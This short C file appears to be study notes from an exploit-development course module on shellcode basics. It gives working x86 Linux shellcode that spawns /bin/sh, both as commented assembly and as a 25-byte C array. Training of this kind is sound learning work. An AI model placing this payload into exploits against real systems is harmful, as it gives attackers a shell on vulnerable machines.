/*
Following video: Module 2-1: Shellcode Basics
Code used: http://shell-storm.org/shellcode/files/shellcode-827.php
// Modified from 23 to 25 bytes by adding the XOR EDX, EDX

xor edx, edx      // Added this due to EXEC requiring a 4th var (EDX) to be null
xor eax, eax
push  eax
push  0x68732f2f
push  0x6e69622f
mov ebx, esp
push  eax
push  ebx
mov ecx, esp
mov al, 0xb
int 0x80
*/

/*
unsigned char shellcode[] = {
  "0xCC, 0x90, 0x90"
};
*/

unsigned char shellcode[] = {
"\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
};

unsigned int shellcode_len = sizeof(shellcode)-1;
//unsigned int shellcode_len = 3;
